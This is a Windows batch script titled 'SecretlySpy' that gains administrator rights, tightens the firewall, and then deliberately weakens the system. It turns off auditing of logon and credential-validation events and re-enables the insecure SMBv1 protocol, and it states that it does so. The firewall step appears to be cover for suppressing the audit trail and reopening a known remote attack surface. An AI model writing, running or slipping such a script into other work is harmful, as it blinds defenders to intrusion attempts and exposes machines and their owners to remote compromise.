@echo off
setlocal
title SecretlySpy - Hybrid Security Script
color 0e

::--------------------------------------------------------------------------------
:: Section 1: Administrator Elevation
:: Ensures the script is run with the necessary administrator rights.
::--------------------------------------------------------------------------------
echo Checking for administrator privileges...
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
echo Success: Running with administrator privileges.
echo.

::--------------------------------------------------------------------------------
:: Section 2: Enable and Configure Windows Defender Firewall (ENHANCEMENT)
:: This ENHANCES security by turning the firewall on and setting a secure policy.
::--------------------------------------------------------------------------------
echo [+] Enhancing Windows Defender Firewall configuration...
:: Turn on the firewall for all profiles (Domain, Private, Public)
netsh advfirewall set allprofiles state on
:: Block all inbound connections by default, allow outbound
netsh advfirewall set allprofiles firewallpolicy blockinbound,allowoutbound
:: Enable logging for dropped packets (useful for troubleshooting)
netsh advfirewall set allprofiles logging droppedconnections enable
echo Firewall configured successfully.
echo.

::--------------------------------------------------------------------------------
:: Section 3: Disable Basic System Auditing (REVERSAL)
:: This REVERSES a security setting by stopping logon event logging.
::--------------------------------------------------------------------------------
echo [!] Disabling security audit policies...
:: Disable auditing for failed account logon attempts
auditpol /set /category:"Account Logon" /subcategory:"Credential Validation" /failure:disable
:: Disable auditing for logon events
auditpol /set /category:"Logon/Logoff" /subcategory:"Logon" /success:disable /failure:disable
echo Audit policies disabled successfully.
echo.

::--------------------------------------------------------------------------------
:: Section 4: Re-enable Insecure Protocol SMBv1 (REVERSAL)
:: This REVERSES a security setting by enabling an outdated protocol.
::--------------------------------------------------------------------------------
echo [!] Enabling insecure SMBv1 protocol...
dism /online /Enable-Feature /FeatureName:SMB1Protocol /NoRestart
echo SMBv1 enabled. A restart may be required for this to take full effect.
echo.

echo ---
echo Hybrid script execution complete.
echo - Firewall settings have been ENHANCED.
echo - WARNING: Audit policies and SMBv1 have been reverted to a less secure state.
pause
exit
